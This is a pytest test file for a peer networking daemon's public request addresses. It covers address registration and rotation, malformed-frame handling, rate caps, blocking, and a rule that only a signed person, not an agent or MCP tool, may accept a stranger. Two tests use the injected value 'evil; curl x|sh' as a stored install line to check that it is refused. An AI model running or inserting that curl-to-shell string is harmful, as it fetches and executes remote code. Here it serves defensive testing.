"""D8.2 public request addresses: strangers may ask; only the person may accept."""
from __future__ import annotations

import threading
import time
from pathlib import Path

import pytest

import joincode
from test_nakd import net, wait  # noqa: F401 - also resolves the sibling sthambha checkout
from network import nak, nak_mcp, nakd
from network.client import NakClient


RELEASE = {"url": "https://releases.example", "channel": "canary",
           "pubkey": "ef" * 32, "version": "1.2.3"}


def _install_line(code):
    base = f"{RELEASE['url']}/{RELEASE['channel']}/{RELEASE['version']}"
    return (f"mkdir -p ~/nak-join && cd ~/nak-join && curl -fsSO {base}/install.py "
            f"-O {base}/releasekit.py && printf '%s  install.py\\n%s  releasekit.py\\n' "
            f"{'1' * 64} {'2' * 64} | sha256sum -c --quiet && python3 install.py join '{code}'")


def _control_proof(party, op, aid, ts=None):
    ts = int(time.time()) if ts is None else ts
    statement = nakd.canonical(
        {"kind": "nak.address.control.v1", "op": op, "aid": aid, "ts": ts})
    return {"ts": ts, "signature": party.person_priv.sign(statement).hex()}


def _address(p, *, days=90, now=None, name="Biswa"):
    code = joincode.encode_address(
        p.person_priv, p.node.node, [{"node": p.node.node, "addrs": ["127.0.0.1"]}],
        days=days, now=now, from_name=name, release=RELEASE)
    address = joincode.decode_address(code, now=now + 1 if now is not None else None)
    proof = _control_proof(p, "register_address", address["aid"])
    p.node.register_address(code, _install_line(code), **proof)
    return code, address


def _frame(inviter, stranger, address, **changes):
    body = {"person": stranger.person_pub, "node": stranger.node.node, "nickname": "Stranger",
            "address": address["aid"], "mid": "ab" * 12}
    body.update(changes)
    env = stranger.node._sign("contact.request", inviter.person_pub, body)
    return {"t": "env", "env": env, "body": body}


def _take_address(inviter, frame, address):
    return inviter.node._take_request(frame, "address", address["aid"])


def _person_accept(party, request_id, petname="stranger"):
    ts = int(time.time())
    sig = party.person_priv.sign(nakd.accept_statement(request_id, petname, ts)).hex()
    return party.node.accept(request_id, petname, ts=ts, signature=sig)


def _signed_frame(inviter, stranger, body):
    env = stranger.node._sign("contact.request", inviter.person_pub, body)
    return {"t": "env", "env": env, "body": body}


def _pair(node, private_key, rid, pin, binding, frame):
    sock, channel = node._dial(rid, private_key, pin, True, binding)
    try:
        sock.settimeout(2)
        nakd.send_frame(channel, frame)
        return nakd.recv_frame(channel)
    finally:
        nakd._close(sock)


def _address_pair(inviter, stranger, address, frame):
    return _pair(
        stranger.node, bytes.fromhex(address["ik"]), joincode.address_rendezvous(address),
        inviter.node.node, b"nak-address-v1|" + address["aid"].encode(), frame)


def _invite_pair(inviter, stranger, invite, frame):
    return _pair(
        stranger.node, bytes.fromhex(invite["ik"]), joincode.invite_rendezvous(invite),
        inviter.node.node, b"nak-invite-v1|" + invite["nonce"].encode(), frame)


def test_address_redeem_over_real_relay_and_relistens(net):
    inviter, first, second = net("inviter"), net("first"), net("second")
    code, address = _address(inviter)
    assert first.node.redeem(code, nickname="One", wait_s=15)["state"] == "request sent"
    assert wait(lambda: len(inviter.node.store.requests()) == 1)
    # The same address remains live after a completed pairing.
    assert second.node.redeem(code, nickname="Two", wait_s=15)["state"] == "request sent"
    assert wait(lambda: len(inviter.node.store.requests()) == 2)
    assert {row["source"] for row in inviter.node.store.requests()} == {"address"}
    assert {row["source_id"] for row in inviter.node.store.requests()} == {address["aid"]}


def test_malformed_address_pairings_never_kill_listener(net):
    inviter, stranger = net("inviter"), net("stranger")
    code, address = _address(inviter)
    base = {"person": stranger.person_pub, "node": stranger.node.node, "nickname": "Stranger",
            "address": address["aid"], "mid": "ab" * 12}
    malformed = [
        {},
        {"t": "env"},
        {"t": "env", "env": "x", "body": {}},
        {"t": "env", "env": {}, "body": "x"},
        *[_signed_frame(inviter, stranger, dict(base, person=value))
          for value in (7, None, [stranger.person_pub])],
        *[_signed_frame(inviter, stranger, {key: value for key, value in base.items() if key != missing})
          for missing in ("person", "node", "nickname", "address", "mid")],
        _signed_frame(inviter, stranger, dict(base, nickname="x" * 100_000)),
        _signed_frame(inviter, stranger, dict(base, address="x" * 100_000)),
    ]
    for frame in malformed:
        reply = _address_pair(inviter, stranger, address, frame)
        assert reply and reply["t"] == "nack"
    assert stranger.node.redeem(code, nickname="valid", wait_s=15)["state"] == "request sent"
    assert wait(lambda: len(inviter.node.store.requests()) == 1)


def test_invite_and_address_listeners_reject_each_others_bodies(net):
    inviter, stranger = net("inviter"), net("stranger")
    invite_code = inviter.invite()
    invite = joincode.decode_invite(invite_code)
    _address_code, address = _address(inviter)
    common = {"person": stranger.person_pub, "node": stranger.node.node, "nickname": "Stranger",
              "mid": "ab" * 12}

    malformed = {"t": "env", "env": "x", "body": {}}
    assert _invite_pair(inviter, stranger, invite, malformed)["t"] == "nack"
    address_body = dict(common, address=address["aid"])
    assert _invite_pair(inviter, stranger, invite,
                        _signed_frame(inviter, stranger, address_body))["t"] == "nack"
    assert inviter.node.store.requests() == []
    assert any(row["nonce"] == invite["nonce"] for row in inviter.node.store.open_invites())

    empty_invite_body = dict(common, invite="")
    assert _address_pair(inviter, stranger, address,
                         _signed_frame(inviter, stranger, empty_invite_body))["t"] == "nack"
    assert inviter.node.store.requests() == []


def test_enabled_address_restarts_its_listener_from_side_table(net):
    inviter = net("inviter")
    code, address = _address(inviter)
    inviter.node.stop()
    restarted = nakd.Node(
        inviter.dir / "net", inviter.node_key, inviter.signer.handle, agent="pa",
        relay=inviter.node.relay).start()
    inviter.node = restarted
    status = restarted.address_status()
    assert status["enabled"] and status["code"] == code
    assert f"address:{address['aid']}" in restarted._threads


def test_address_control_requires_person_proof_and_retired_aids_never_revive(net):
    inviter = net("inviter")
    code = joincode.encode_address(
        inviter.person_priv, inviter.node.node,
        [{"node": inviter.node.node, "addrs": ["127.0.0.1"]}], release=RELEASE)
    address = joincode.decode_address(code)
    line = _install_line(code)
    missing = nakd.handle(inviter.node, {"op": "register_address", "code": code,
                                         "install_line": "evil; curl x|sh"})
    assert not missing["ok"] and "person" in missing["error"]

    proof = _control_proof(inviter, "register_address", address["aid"])
    assert nakd.handle(inviter.node, {"op": "register_address", "code": code,
                                      "install_line": line, **proof})["ok"]
    wrong_op = nakd.handle(inviter.node, {"op": "address_off", "aid": address["aid"], **proof})
    assert not wrong_op["ok"] and "person" in wrong_op["error"]
    stale = _control_proof(inviter, "address_off", address["aid"], int(time.time()) - 121)
    assert not nakd.handle(inviter.node, {"op": "address_off", "aid": address["aid"], **stale})["ok"]
    other_aid = "00" * 16
    wrong_aid = _control_proof(inviter, "address_off", other_aid)
    assert not nakd.handle(inviter.node, {"op": "address_off", "aid": address["aid"],
                                          **wrong_aid})["ok"]
    off_proof = _control_proof(inviter, "address_off", address["aid"])
    assert nakd.handle(inviter.node, {"op": "address_off", "aid": address["aid"],
                                      **off_proof})["ok"]
    revive = nakd.handle(inviter.node, {"op": "register_address", "code": code,
                                        "install_line": line, **proof})
    assert not revive["ok"] and "retired" in revive["error"]
    assert not any("address" in name for name in (*nak_mcp.READ_TOOLS, *nak_mcp.CONNECT_TOOLS))


def test_address_show_refuses_a_tampered_stored_install_line(net):
    inviter = net("inviter")
    code = joincode.encode_address(
        inviter.person_priv, inviter.node.node,
        [{"node": inviter.node.node, "addrs": ["127.0.0.1"]}], release=RELEASE)
    address = joincode.decode_address(code)
    proof = _control_proof(inviter, "register_address", address["aid"])
    result = nakd.handle(inviter.node, {"op": "register_address", "code": code,
                                        "install_line": _install_line(code), **proof})
    assert result["ok"]
    inviter.node.store._q("UPDATE address_state SET install_line=? WHERE slot=1",
                          ("evil; curl x|sh " + code,))
    assert inviter.node.address_status().get("install_line", "") == ""


def test_address_rotation_off_wrong_aid_and_expiry_are_immediate(net):
    inviter, stranger = net("inviter"), net("stranger")
    _old_code, old = _address(inviter)
    _new_code, new = _address(inviter)
    assert old["aid"] != new["aid"]
    refused = _take_address(inviter, _frame(inviter, stranger, old), old)
    assert refused == {"t": "nack", "why": "request address is off, expired, or no longer current"}
    assert inviter.node.store.requests() == []
    inviter.node.address_off(new["aid"], **_control_proof(inviter, "address_off", new["aid"]))
    assert _take_address(inviter, _frame(inviter, stranger, new), new)["t"] == "nack"
    _code, current = _address(inviter)
    inviter.node.store._q("UPDATE address_state SET expires_at=? WHERE slot=1", (int(time.time()) - 1,))
    assert "expired" in _take_address(inviter, _frame(inviter, stranger, current), current)["why"]


@pytest.mark.parametrize("ledger", [False, True], ids=["without-ledger", "with-ledger"])
def test_both_address_and_invite_are_rejected_without_consuming(net, ledger):
    inviter, stranger = net("inviter"), net("stranger")
    invite_code = inviter.invite()
    invite = joincode.decode_invite(invite_code)
    _code, address = _address(inviter)
    changes = {"invite": invite["nonce"]}
    if ledger:
        changes["ledger_key"] = stranger.node.node
    reply = _take_address(inviter, _frame(inviter, stranger, address, **changes), address)
    assert reply["t"] == "nack"
    assert any(row["nonce"] == invite["nonce"] for row in inviter.node.store.open_invites())
    assert inviter.node.store.requests() == []


def test_address_request_gates_self_block_contact_and_per_person(net):
    inviter, stranger = net("inviter"), net("stranger")
    _code, address = _address(inviter)

    self_body = {"person": inviter.person_pub, "node": inviter.node.node, "nickname": "me",
                 "address": address["aid"], "mid": "cd" * 12}
    self_env = inviter.node._sign("contact.request", inviter.person_pub, self_body)
    assert _take_address(inviter, {"t": "env", "env": self_env, "body": self_body}, address)["why"] == \
        "cannot connect to yourself"

    inviter.node.store.block(stranger.person_pub, int(time.time()) + 60, "test")
    logs = []
    inviter.node.log = logs.append
    assert _take_address(inviter, _frame(inviter, stranger, address), address)["why"] == \
        "request not accepted right now"
    assert any("blocked" in line for line in logs)
    inviter.node.store.unblock(stranger.person_pub)

    assert _take_address(inviter, _frame(inviter, stranger, address), address)["t"] == "ack"
    assert _take_address(inviter, _frame(inviter, stranger, address), address)["why"] == \
        "request not accepted right now"
    rid = inviter.node.store.requests()[0]["id"]
    inviter.node.store.decide_request(rid, False)
    inviter.node.store.upsert_contact(stranger.person_pub, stranger.node.node, "active", "known")
    assert _take_address(inviter, _frame(inviter, stranger, address), address)["why"] == \
        "request not accepted right now"


def test_address_pending_total_and_rolling_daily_caps(net):
    inviter, stranger = net("inviter"), net("stranger")
    _code, address = _address(inviter)
    for index in range(nakd.ADDRESS_PENDING_TOTAL_MAX):
        inviter.node.store.add_request(
            f"{index + 1:064x}", f"{index + 101:064x}", "load", "", source="address",
            source_id=address["aid"])
    assert _take_address(inviter, _frame(inviter, stranger, address), address)["why"] == \
        "request not accepted right now"

    for row in inviter.node.store.requests():
        inviter.node.store.decide_request(row["id"], True)
    existing = nakd.ADDRESS_PENDING_TOTAL_MAX
    for index in range(nakd.ADDRESS_DAILY_MAX - existing):
        rid = inviter.node.store.add_request(
            f"{index + 1000:064x}", f"{index + 2000:064x}", "daily", "", source="address",
            source_id=address["aid"])
        inviter.node.store.decide_request(rid, True)
    assert _take_address(inviter, _frame(inviter, stranger, address), address)["why"] == \
        "request not accepted right now"
    inviter.node.store._q(
        "UPDATE requests SET received=? WHERE id IN (SELECT request_id FROM request_sources)",
        (int(time.time()) - 86401,))
    assert _take_address(inviter, _frame(inviter, stranger, address), address)["t"] == "ack"


def test_address_pending_requests_expire_on_intake_and_periodic_sweep(net):
    inviter, stranger = net("inviter"), net("stranger")
    _code, address = _address(inviter)
    now = [int(time.time())]
    inviter.node._clock = lambda: now[0]
    for index in range(nakd.ADDRESS_PENDING_TOTAL_MAX):
        inviter.node.store.add_request(
            f"{index + 1:064x}", f"{index + 101:064x}", "stale", "", source="address",
            source_id=address["aid"], received=now[0] - nakd.ADDRESS_PENDING_TTL_S - 1)
    assert _take_address(inviter, _frame(inviter, stranger, address), address)["t"] == "ack"
    assert len(inviter.node.store.requests("expired")) == nakd.ADDRESS_PENDING_TOTAL_MAX
    assert len(inviter.node.store.requests()) == 1

    now[0] += nakd.ADDRESS_PENDING_TTL_S + 1
    inviter.node.sweep(now=now[0])
    assert len(inviter.node.store.requests()) == 0
    assert len(inviter.node.store.requests("expired")) == nakd.ADDRESS_PENDING_TOTAL_MAX + 1


def test_address_cap_check_and_insert_share_one_immediate_transaction(net):
    inviter, stranger = net("inviter"), net("stranger")
    _code, address = _address(inviter)
    statements = []
    inviter.node.store._db.set_trace_callback(statements.append)
    try:
        assert _take_address(inviter, _frame(inviter, stranger, address), address)["t"] == "ack"
    finally:
        inviter.node.store._db.set_trace_callback(None)
    upper = [statement.upper() for statement in statements]
    begin = next(i for i, statement in enumerate(upper) if statement.startswith("BEGIN IMMEDIATE"))
    count = next(i for i, statement in enumerate(upper)
                 if "COUNT(*)" in statement and "REQUEST_SOURCES" in statement)
    insert = next(i for i, statement in enumerate(upper) if "INSERT INTO REQUESTS" in statement)
    assert begin < count < insert


def _control_server(node, tmp_path):
    stop = threading.Event()
    sock = tmp_path / "nakd.sock"
    threading.Thread(target=nakd.serve_control, args=(node, sock, stop), daemon=True).start()
    assert wait(sock.exists)
    return sock, stop


def test_address_accept_is_one_guard_for_mcp_socket_cli_and_person(net, tmp_path, monkeypatch):
    inviter, stranger = net("inviter"), net("stranger")
    _code, address = _address(inviter)
    assert _take_address(inviter, _frame(inviter, stranger, address), address)["t"] == "ack"
    request = inviter.node.store.requests()[0]
    expected = f"a person must accept this one: nak accept {request['id']}"

    direct = nakd.handle(inviter.node, {"op": "accept", "id": request["id"], "petname": "s"})
    assert direct == {"ok": False, "error": expected}

    sock, stop = _control_server(inviter.node, tmp_path)
    server = nak_mcp.Server(NakClient(sock), allow_connect=True)
    result = server.handle({"jsonrpc": "2.0", "id": 1, "method": "tools/call",
                            "params": {"name": "nak_accept",
                                       "arguments": {"id": request["id"], "name": "s"}}})["result"]
    assert result["isError"] and expected in result["content"][0]["text"]

    def fake_call(_sock, req):
        if req["op"] == "requests":
            return {"requests": [dict(request, requires_person=True)]}
        raise AssertionError("non-TTY CLI must stop before the accept socket op")

    monkeypatch.setattr(nak, "call", fake_call)
    with pytest.raises(SystemExit, match=expected):
        nak.main(["--sock", str(sock), "accept", request["id"], "--as", "s"])
    assert inviter.node.store.request(request["id"]) is not None

    assert _person_accept(inviter, request["id"], "s")["person"] == stranger.person_pub
    assert inviter.node.store.request(request["id"]) is None
    stop.set()


def test_invite_accept_unchanged_and_address_ledger_never_creates_starter(net):
    inviter, address_stranger, invited = net("inviter"), net("address"), net("invited")
    _code, address = _address(inviter)
    frame = _frame(inviter, address_stranger, address, ledger_key=address_stranger.node.node)
    assert _take_address(inviter, frame, address)["t"] == "ack"
    address_request = inviter.node.store.requests()[0]
    assert address_request["ledger_key"] == address_stranger.node.node
    _person_accept(inviter, address_request["id"])
    assert inviter.node.store.starter_rows() == []

    code = inviter.invite()
    assert invited.node.redeem(code, wait_s=15)["state"] == "request sent"
    assert wait(lambda: len(inviter.node.store.requests()) == 1)
    invite_request = inviter.node.store.requests()[0]
    assert invite_request["source"] == "invite" and not invite_request.get("requires_person")
    assert inviter.node.accept(invite_request["id"])["person"] == invited.person_pub


def test_decline_blocks_30_days_and_manual_block_round_trip(net):
    inviter, stranger = net("inviter"), net("stranger")
    _code, address = _address(inviter)
    _take_address(inviter, _frame(inviter, stranger, address), address)
    rid = inviter.node.store.requests()[0]["id"]
    before = int(time.time())
    result = inviter.node.decline(rid)
    assert before + 30 * 86400 <= result["blocked_until"] <= int(time.time()) + 30 * 86400
    assert inviter.node.blocked()[0]["person"] == stranger.person_pub
    assert _take_address(inviter, _frame(inviter, stranger, address), address)["why"] == \
        "request not accepted right now"
    inviter.node.unblock(stranger.person_pub)
    assert inviter.node.blocked() == []
    blocked = inviter.node.block(rid, days=2)
    assert blocked["person"] == stranger.person_pub and inviter.node.blocked()


def test_cli_address_on_show_off_rotates(monkeypatch, tmp_path, capsys):
    from cryptography.hazmat.primitives.asymmetric import ed25519
    key = ed25519.Ed25519PrivateKey.generate()
    state = {"row": {"enabled": False}}
    calls = []

    def fake_call(_sock, req):
        calls.append(req)
        if req["op"] == "status":
            return {"node": "ab" * 32, "relay": "relay.example:51820"}
        if req["op"] == "register_address":
            decoded = joincode.decode_address(req["code"])
            state["row"] = {"enabled": True, "code": req["code"], "aid": decoded["aid"],
                            "expires_at": decoded["expires_at"], "install_line": req["install_line"]}
            return {"aid": decoded["aid"], "expires_at": decoded["expires_at"]}
        if req["op"] == "address_status":
            return state["row"]
        if req["op"] == "address_off":
            state["row"] = {"enabled": False}
            return state["row"]
        raise AssertionError(req)

    monkeypatch.setattr(nak, "call", fake_call)
    monkeypatch.setattr(nak, "_load_matching_person_key", lambda: key)
    monkeypatch.setattr(nak, "_release_for_invite", lambda *_a: (RELEASE, "install {CODE}"))
    monkeypatch.setenv("NAK_NET_DIR", str(tmp_path / "net"))
    assert nak.main(["address", "on", "--days", "30", "--name", "Biswa"]) == 0
    first = state["row"]["aid"]
    capsys.readouterr()
    assert nak.main(["address", "on"]) == 0
    assert state["row"]["aid"] != first
    capsys.readouterr()
    assert nak.main(["address", "show"]) == 0
    shown = capsys.readouterr().out
    assert state["row"]["code"] in shown and state["row"]["install_line"] in shown
    assert nak.main(["address", "off"]) == 0
    assert not state["row"]["enabled"]


def test_join_docs_state_address_expiry_person_control_and_source_trust():
    text = (Path(__file__).resolve().parents[1] / "docs" / "JOIN.md").read_text()
    assert "expires after 7 days and no longer occupies a slot" in text
    assert "requires a fresh signature from the person\nkey; an agent, MCP tool, or bare socket caller" in text
    assert "trusted only as much as wherever you found it,\nexactly like an invite" in text
